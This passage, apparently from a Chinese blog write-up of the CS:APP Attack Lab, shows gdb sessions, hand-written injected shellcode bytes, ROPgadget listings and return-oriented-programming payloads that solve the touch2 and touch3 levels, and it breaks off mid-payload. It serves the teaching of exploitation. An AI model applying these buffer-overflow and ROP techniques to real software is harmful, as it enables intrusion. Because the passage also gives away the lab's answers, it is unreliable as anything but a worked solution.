class="number">0x28</span>,%rsp</span><br><span class="line">   <span class="number">0x00000000004017bd</span> &lt;+<span class="number">21</span>&gt;:	retq   </span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) info r rsp <span class="comment">// 打印rsp</span></span><br><span class="line">rsp            <span class="number">0x5561dca0</span>          <span class="number">0x5561dca0</span></span><br></pre></td></tr></table></figure>
<p>结合 rsp 的地址，手写注入代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">48</span> c7 c7 fa <span class="number">97</span> b9 <span class="number">59</span> <span class="number">68</span> </span><br><span class="line">ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> c3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">78</span> dc <span class="number">61</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/attacklab-target1] ./hex2raw -i solutions/level2.txt | ./ctarget -q</span><br><span class="line">Cookie: <span class="number">0x59b997fa</span></span><br><span class="line">Type <span class="built_in">string</span>:Touch2!: <span class="function">You called <span class="title">touch2</span><span class="params">(<span class="number">0x59b997fa</span>)</span></span></span><br><span class="line"><span class="function">Valid solution <span class="keyword">for</span> level 2 with target ctarget</span></span><br><span class="line"><span class="function">PASS: Would have posted the following:</span></span><br><span class="line"><span class="function">	user id	bovik</span></span><br><span class="line"><span class="function">	course	15213-f15</span></span><br><span class="line"><span class="function">	lab	attacklab</span></span><br><span class="line"><span class="function">	result	1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 </span></span><br></pre></td></tr></table></figure>
<p><strong>touch3</strong></p>
<img src="/2022/02/23/CSapp-Attack%20Lab/1645610038824.png" class width="1645610038824"> 
<p>出现了一个函数：</p>
<img src="/2022/02/23/CSapp-Attack%20Lab/1645610107523.png" class width="1645610107523"> 
<p>“sprintf”对 cookie 进行了操作，把它变为了16进制形式的字符串</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cookie: <span class="number">59b</span>997fa</span><br><span class="line">-&gt; <span class="number">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span></span><br></pre></td></tr></table></figure>
<p>思路就是：把字符串提前放入某个地址，把那个地址赋值给 rdi 就可以了</p>
<p>现在先考虑把字符串放在哪里</p>
<p><code>s</code>的位置是随机的，所以之前留在<code>getbuf</code>中的数据，则有可能被<code>hexmatch</code>所重写，所以放在<code>getbuf</code>中并不安全。为了安全起见，我们把字符串放在<code>getbuf</code>的父栈帧中，也就是<code>test</code>栈帧中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b* <span class="number">0x401968</span> <span class="comment">// 在test处打断点</span></span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0x401968</span>: file visible.c, line <span class="number">90.</span></span><br><span class="line">(gdb) run -q</span><br><span class="line">Starting program: /home/ywhkkx/attacklab-target1/ctarget -q</span><br><span class="line">Cookie: <span class="number">0x59b997fa</span></span><br><span class="line"></span><br><span class="line">Breakpoint <span class="number">1</span>, test () at visible.c:<span class="number">90</span></span><br><span class="line"><span class="number">90</span>	visible.c: 没有那个文件或目录.</span><br><span class="line">(gdb) disas</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function test:</span><br><span class="line">=&gt; <span class="number">0x0000000000401968</span> &lt;+<span class="number">0</span>&gt;:	sub    $<span class="number">0x8</span>,%rsp</span><br><span class="line">   <span class="number">0x000000000040196c</span> &lt;+<span class="number">4</span>&gt;:	mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">   <span class="number">0x0000000000401971</span> &lt;+<span class="number">9</span>&gt;:	callq  <span class="number">0x4017a8</span> &lt;getbuf&gt;</span><br><span class="line">   <span class="number">0x0000000000401976</span> &lt;+<span class="number">14</span>&gt;:	mov    %eax,%edx</span><br><span class="line">   <span class="number">0x0000000000401978</span> &lt;+<span class="number">16</span>&gt;:	mov    $<span class="number">0x403188</span>,%esi</span><br><span class="line">   <span class="number">0x000000000040197d</span> &lt;+<span class="number">21</span>&gt;:	mov    $<span class="number">0x1</span>,%edi</span><br><span class="line">   <span class="number">0x0000000000401982</span> &lt;+<span class="number">26</span>&gt;:	mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">   <span class="number">0x0000000000401987</span> &lt;+<span class="number">31</span>&gt;:	callq  <span class="number">0x400df0</span> &lt;__printf_chk@plt&gt;</span><br><span class="line">   <span class="number">0x000000000040198c</span> &lt;+<span class="number">36</span>&gt;:	add    $<span class="number">0x8</span>,%rsp</span><br><span class="line">   <span class="number">0x0000000000401990</span> &lt;+<span class="number">40</span>&gt;:	retq   </span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) info r rsp</span><br><span class="line">rsp            <span class="number">0x5561dcb0</span>          <span class="number">0x5561dcb0</span></span><br></pre></td></tr></table></figure>
<p>写入字符串的目标地址：0x5561dcb0 - 0x8</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** inject.s */</span>  </span><br><span class="line">movq    $<span class="number">0x5561dca8</span>, %rdi</span><br><span class="line">pushq   <span class="number">0x4018fa</span></span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/attacklab-target1/solutions] gcc -c inject.s    </span><br><span class="line">➜  [/home/ywhkkx/attacklab-target1/solutions] objdump -d inject.o</span><br><span class="line"></span><br><span class="line">inject.o：     文件格式 elf64-x86<span class="number">-64</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line"><span class="number">0000000000000000</span> &lt;.text&gt;:</span><br><span class="line">   <span class="number">0</span>:	<span class="number">48</span> c7 c7 a8 dc <span class="number">61</span> <span class="number">55</span> 	mov    $<span class="number">0x5561dca8</span>,%rdi</span><br><span class="line">   <span class="number">7</span>:	ff <span class="number">34</span> <span class="number">25</span> fa <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> 	pushq  <span class="number">0x4018fa</span></span><br><span class="line">   e:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p>手写注入代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">48</span> c7 c7 a8 dc <span class="number">61</span> <span class="number">55</span> <span class="number">68</span> <span class="comment">// 注入代码</span></span><br><span class="line">fa <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> c3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">78</span> dc <span class="number">61</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span> <span class="comment">// cookie</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/attacklab-target1] ./hex2raw -i solutions/level3.txt | ./ctarget -q </span><br><span class="line">Cookie: <span class="number">0x59b997fa</span></span><br><span class="line">Type <span class="built_in">string</span>:Touch3!: <span class="function">You called <span class="title">touch3</span><span class="params">(<span class="string">&quot;59b997fa&quot;</span>)</span></span></span><br><span class="line"><span class="function">Valid solution <span class="keyword">for</span> level 3 with target ctarget</span></span><br><span class="line"><span class="function">PASS: Would have posted the following:</span></span><br><span class="line"><span class="function">	user id	bovik</span></span><br><span class="line"><span class="function">	course	15213-f15</span></span><br><span class="line"><span class="function">	lab	attacklab</span></span><br><span class="line"><span class="function">	result	1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 </span></span><br></pre></td></tr></table></figure>
<h2 id="ROP攻击"><a href="#ROP攻击" class="headerlink" title="ROP攻击"></a>ROP攻击</h2><p>缓冲区溢出攻击的普遍发生给计算机系统造成了许多麻烦，现代的编译器和操作系统实现了许多机制，以避免遭受这样的攻击，限制入侵者通过缓冲区溢出攻击获得系统控制的方式 </p>
<ul>
<li>栈随机化（PIE）</li>
<li>栈破坏检测（canary）</li>
<li>限制可执行代码区域（NX）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setval_210</span><span class="params">(<span class="keyword">unsigned</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  *p = <span class="number">3347663060U</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000000000400f</span>15 &lt;setval_210&gt;:</span><br><span class="line">  <span class="number">400f</span>15: c7 <span class="number">07</span> d4 <span class="number">48</span> <span class="number">89</span> c7 movl $<span class="number">0xc78948d4</span>,(%rdi)</span><br><span class="line">  <span class="number">400f</span>1b: c3 retq</span><br></pre></td></tr></table></figure>
<p>可以使用 ret 把 IP 控制在 “0x400f18”（0x48，movq）处，控制完 rdi 后就 ret 下一个地址</p>
<p>这样穿起来的ROP操作就被称为ROP链</p>
<p><strong>touch2 ROP</strong></p>
<p>为了控制 touch2 ，我们需要把 cookie 放入 rdi 寄存器</p>
<p>在“farm.c”中存放有我们需要的 gadget ，这里采用 ROPgadget 工具来获取 gadget</p>
<p>目标：“mov  xxx  rdi”，“pop  xxx  rdi”（以下这种汇编方式和之前使用的不同）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/attacklab-target1] ROPgadget --binary ./rtarget --only <span class="string">&quot;mov|ret&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line"><span class="number">0x0000000000401b23</span> : mov byte ptr [rax + <span class="number">0x605500</span>], <span class="number">0</span> ; ret</span><br><span class="line"><span class="number">0x0000000000400f63</span> : mov byte ptr [rip + <span class="number">0x20454e</span>], <span class="number">1</span> ; ret</span><br><span class="line"><span class="number">0x000000000040214e</span> : mov dword ptr [rdi + <span class="number">8</span>], eax ; ret</span><br><span class="line"><span class="number">0x00000000004019e1</span> : mov dword ptr [rdi], <span class="number">0x9090d199</span> ; ret</span><br><span class="line"><span class="number">0x00000000004019c3</span> : mov dword ptr [rdi], <span class="number">0x90c78948</span> ; ret</span><br><span class="line"><span class="number">0x0000000000401aab</span> : mov dword ptr [rdi], <span class="number">0x90e08948</span> ; ret</span><br><span class="line"><span class="number">0x0000000000401a5a</span> : mov dword ptr [rdi], <span class="number">0x91e08948</span> ; ret</span><br><span class="line"><span class="number">0x00000000004019b5</span> : mov dword ptr [rdi], <span class="number">0x9258c254</span> ; ret</span><br><span class="line"><span class="number">0x00000000004019fc</span> : mov dword ptr [rdi], <span class="number">0xc084d181</span> ; ret</span><br><span class="line"><span class="number">0x0000000000401a97</span> : mov dword ptr [rdi], <span class="number">0xc2e08948</span> ; ret</span><br><span class="line"><span class="number">0x0000000000401a6e</span> : mov dword ptr [rdi], <span class="number">0xc391d189</span> ; ret</span><br><span class="line"><span class="number">0x00000000004019bc</span> : mov dword ptr [rdi], <span class="number">0xc78d4863</span> ; ret</span><br><span class="line"><span class="number">0x00000000004019ae</span> : mov dword ptr [rdi], <span class="number">0xc7c78948</span> ; ret</span><br><span class="line"><span class="number">0x0000000000401a0a</span> : mov dword ptr [rdi], <span class="number">0xc908c288</span> ; ret</span><br><span class="line"><span class="number">0x0000000000401a7c</span> : mov dword ptr [rdi], <span class="number">0xc908ce09</span> ; ret</span><br><span class="line"><span class="number">0x0000000000401a75</span> : mov dword ptr [rdi], <span class="number">0xd238c281</span> ; ret</span><br><span class="line"><span class="number">0x0000000000401a2c</span> : mov dword ptr [rdi], <span class="number">0xdb08ce81</span> ; ret</span><br><span class="line"><span class="number">0x0000000000401b10</span> : mov dword ptr [rip + <span class="number">0x2045ee</span>], eax ; ret</span><br><span class="line"><span class="number">0x0000000000402dd7</span> : mov eax, <span class="number">0</span> ; ret</span><br><span class="line"><span class="number">0x000000000040199a</span> : mov eax, <span class="number">0x909078fb</span> ; ret</span><br><span class="line"><span class="number">0x00000000004019db</span> : mov eax, <span class="number">0x90c2895c</span> ; ret</span><br><span class="line"><span class="number">0x0000000000401a91</span> : mov eax, <span class="number">0xc020ce88</span> ; ret</span><br><span class="line"><span class="number">0x00000000004019f6</span> : mov eax, <span class="number">0xc048d189</span> ; ret</span><br><span class="line"><span class="number">0x0000000000401a18</span> : mov eax, <span class="number">0xc1e08948</span> ; ret</span><br><span class="line"><span class="number">0x00000000004019ca</span> : mov eax, <span class="number">0xc3905829</span> ; ret</span><br><span class="line"><span class="number">0x0000000000401a33</span> : mov eax, <span class="number">0xc938d189</span> ; ret</span><br><span class="line"><span class="number">0x0000000000401a54</span> : mov eax, <span class="number">0xc9c4c289</span> ; ret</span><br><span class="line"><span class="number">0x0000000000401a4e</span> : mov eax, <span class="number">0xd208d199</span> ; ret</span><br><span class="line"><span class="number">0x0000000000401aa5</span> : mov eax, <span class="number">0xd220ce8d</span> ; ret</span><br><span class="line"><span class="number">0x0000000000401a68</span> : mov eax, <span class="number">0xdb08d189</span> ; ret</span><br><span class="line"><span class="number">0x0000000000401994</span> : mov eax, <span class="number">1</span> ; ret</span><br><span class="line"><span class="number">0x0000000000401a07</span> : mov eax, esp ; ret</span><br><span class="line"><span class="number">0x0000000000401a9a</span> : mov eax, esp ; ret <span class="number">0x8dc3</span></span><br><span class="line"><span class="number">0x00000000004019b2</span> : mov edi, <span class="number">0x5407c7c3</span> ; ret <span class="number">0x9258</span></span><br><span class="line"><span class="number">0x00000000004019a3</span> : mov edi, eax ; ret <span class="comment">// target</span></span><br><span class="line"><span class="number">0x000000000040214d</span> : mov qword ptr [rdi + <span class="number">8</span>], rax ; ret</span><br><span class="line"><span class="number">0x0000000000401a06</span> : mov rax, rsp ; ret</span><br><span class="line"><span class="number">0x0000000000401a99</span> : mov rax, rsp ; ret <span class="number">0x8dc3</span></span><br><span class="line"><span class="number">0x00000000004019a2</span> : mov rdi, rax ; ret</span><br><span class="line"><span class="number">0x0000000000400c55</span> : ret</span><br><span class="line"><span class="number">0x0000000000403fbc</span> : ret <span class="number">0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/attacklab-target1] ROPgadget --binary ./rtarget --only <span class="string">&quot;pop|ret&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line"><span class="number">0x0000000000402b12</span> : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line"><span class="number">0x000000000040137e</span> : pop r12 ; pop r13 ; pop r14 ; ret</span><br><span class="line"><span class="number">0x00000000004021d7</span> : pop r12 ; pop r13 ; ret</span><br><span class="line"><span class="number">0x00000000004018f7</span> : pop r12 ; ret</span><br><span class="line"><span class="number">0x0000000000402b14</span> : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line"><span class="number">0x0000000000401380</span> : pop r13 ; pop r14 ; ret</span><br><span class="line"><span class="number">0x00000000004021d9</span> : pop r13 ; ret</span><br><span class="line"><span class="number">0x0000000000402b16</span> : pop r14 ; pop r15 ; ret</span><br><span class="line"><span class="number">0x0000000000401382</span> : pop r14 ; ret</span><br><span class="line"><span class="number">0x0000000000402b18</span> : pop r15 ; ret</span><br><span class="line"><span class="number">0x0000000000402b11</span> : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line"><span class="number">0x000000000040137d</span> : pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret</span><br><span class="line"><span class="number">0x00000000004021d6</span> : pop rbp ; pop r12 ; pop r13 ; ret</span><br><span class="line"><span class="number">0x00000000004018f6</span> : pop rbp ; pop r12 ; ret</span><br><span class="line"><span class="number">0x0000000000402b15</span> : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line"><span class="number">0x0000000000401381</span> : pop rbp ; pop r14 ; ret</span><br><span class="line"><span class="number">0x0000000000400ef5</span> : pop rbp ; ret</span><br><span class="line"><span class="number">0x000000000040137c</span> : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret</span><br><span class="line"><span class="number">0x00000000004021d5</span> : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret</span><br><span class="line"><span class="number">0x00000000004018f5</span> : pop rbx ; pop rbp ; pop r12 ; ret</span><br><span class="line"><span class="number">0x00000000004011aa</span> : pop rbx ; pop rbp ; ret</span><br><span class="line"><span class="number">0x0000000000401dab</span> : pop rbx ; ret</span><br><span class="line"><span class="number">0x000000000040141b</span> : pop rdi ; ret <span class="comment">// target</span></span><br><span class="line"><span class="number">0x0000000000402b17</span> : pop rsi ; pop r15 ; ret</span><br><span class="line"><span class="number">0x0000000000401383</span> : pop rsi ; ret</span><br></pre></td></tr></table></figure>
<p>发现直接有 “ pop rdi ”，就使用它了（地址0x000000000040141b）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">1b</span> <span class="number">14</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// pop rdi </span></span><br><span class="line">fa <span class="number">97</span> b9 <span class="number">59</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// cookie</span></span><br><span class="line">ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/attacklab-target1] ./hex2raw -i solutions/level2ROP.txt | ./rtarget -q </span><br><span class="line">Cookie: <span class="number">0x59b997fa</span></span><br><span class="line">Type <span class="built_in">string</span>:Touch2!: <span class="function">You called <span class="title">touch2</span><span class="params">(<span class="number">0x59b997fa</span>)</span></span></span><br><span class="line"><span class="function">Valid solution <span class="keyword">for</span> level 2 with target rtarget</span></span><br><span class="line"><span class="function">Ouch!: You caused a segmentation fault!</span></span><br><span class="line"><span class="function">Better luck next time</span></span><br><span class="line"><span class="function">FAIL: Would have posted the following:</span></span><br><span class="line"><span class="function">	user id	bovik</span></span><br><span class="line"><span class="function">	course	15213-f15</span></span><br><span class="line"><span class="function">	lab	attacklab</span></span><br><span class="line"><span class="function">	result	1:FAIL:0xffffffff:rtarget:0:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 1B 14 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 EC 17 40 00 00 00 00 00 </span></span><br></pre></td></tr></table></figure>
<p><strong>touch3 ROP</strong></p>
<p>和 touch3 相同，因为 cookie 是字符串，所以不能直接传参 rdi ，只能通过写入固定地址的方式间接传参</p>
<p>大体思路：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x401a06</span>:</span><br><span class="line">    mov %rsp, %rax <span class="comment">// 控制栈顶进入rax</span></span><br><span class="line">    retq</span><br><span class="line"><span class="number">0x4019a2</span>: </span><br><span class="line">    mov %rax, %rdi <span class="comment">// 把rax装入rdi</span></span><br><span class="line">    retq</span><br><span class="line"><span class="number">0x4019cc</span>:</span><br><span class="line">	pop %rax <span class="comment">// pop到rax</span></span><br><span class="line">	retq  </span><br><span class="line"><span class="number">0x4019dd</span>:</span><br><span class="line">    mov %eax, %edx <span class="comment">// 移动eax到edx</span></span><br><span class="line">    retq </span><br><span class="line"><span class="number">0x401a70</span>:</span><br><span class="line">    mov %edx, %ecx <span class="comment">// 移动edx到ecx</span></span><br><span class="line">    retq  </span><br><span class="line"><span class="number">0x401a13</span>:</span><br><span class="line">    mov %ecx, %esi <span class="comment">// 移动ecx到esi</span></span><br><span class="line">    retq</span><br><span class="line"><span class="number">0x4019d6</span>: </span><br><span class="line">    lea (%rdi,%rsi,<span class="number">1</span>),%rax <span class="comment">// rdi和rsi相加进入rax</span></span><br><span class="line">    retq</span><br><span class="line"><span class="number">0x4019a2</span>: </span><br><span class="line">    mov %rax, %rdi <span class="comment">// 把rax装入rdi</span></span><br><span class="line">    retq</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">06</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// mov %rsp, %rax</span></span><br><span class="line">a2 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// mov %rax, %rdi </span></span><br><span class="line">cc <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// pop %rax</span></span><br><span class="line"><span class="number">48</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// 偏移</span></span><br><span class="line">dd <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span 